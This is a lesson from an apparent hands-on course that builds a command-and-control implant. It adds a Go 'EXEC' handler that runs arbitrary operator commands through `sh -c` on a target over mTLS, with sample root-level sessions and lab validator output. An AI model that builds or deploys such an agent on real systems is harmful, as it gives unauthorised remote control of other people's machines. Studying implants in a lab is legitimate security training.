# L18: Remote Shell

L17 dispatches commands that map to mkdir calls.
But an operator needs to run arbitrary shell commands on the target.
One new handler, about five lines, gives you remote execution.

## exec.Command

Go's `os/exec` package runs external programs.
`exec.Command("sh", "-c", args)` passes the entire argument string to `sh`,
which handles pipes, redirects, globs, and everything else the shell provides.

`CombinedOutput()` runs the command, waits for it to finish, and returns
stdout and stderr together as a byte slice.

```text
  Server                         Agent
    |                              |
    |--- "EXEC id\n" ------------>|
    |                              |  sh -c "id"
    |                              |  output: "uid=0(root)...\n"
    |<-- "uid=0(root)...\n\n" ----|
    |                              |
    |--- "EXEC cat /etc/host*" -->|
    |                              |  sh -c "cat /etc/host*"
    |<-- "hostname\n127.0...\n" --|
```

The response is the raw command output followed by an empty line (double newline).
The empty line marks the end of output so the server knows when to stop reading.

## The five lines

```go
func handleExec(conn net.Conn, arg string) error {
    out, err := exec.Command("sh", "-c", arg).CombinedOutput()
    if err != nil {
        fmt.Fprintf(conn, "ERR %v\n\n", err)
        return nil
    }
    fmt.Fprintf(conn, "%s\n", out)
    return nil
}
```

That is the entire handler.
`sh -c` does the heavy lifting.
The agent is a thin relay between the TLS connection and the kernel.

## You write

`main.go` (~100 lines):

- Everything from L17 (mTLS, dispatch loop, handler map)
- One new entry in the handler map: EXEC
- `handleExec`: exec.Command, CombinedOutput, write result to conn

## API

```go
import "os/exec"

out, err := exec.Command("sh", "-c", arg).CombinedOutput()
// out is []byte containing stdout+stderr
// err is non-nil if the command exits non-zero
```

## Test it

```
$ rklings run l18
```

The lab server shows a command input field.

```
server> EXEC id
agent:  uid=0(root) gid=0(root) groups=0(root)
server> EXEC cat /etc/hostname
agent:  rklings-vm
server> EXEC ls /nonexistent
agent:  ERR exit status 2
server> PING
agent:  PONG
```

## Validate

```
$ rklings validate l18
  [+] agent connects over mTLS
  [+] EXEC id returns uid=0
  [+] EXEC handles pipes and redirects
  [+] EXEC reports error for bad command
  [+] PING still works alongside EXEC
  PASS
```

## Next

You have command dispatch and shell execution.
L19 adds file transfer: download and upload files over the same TLS connection.
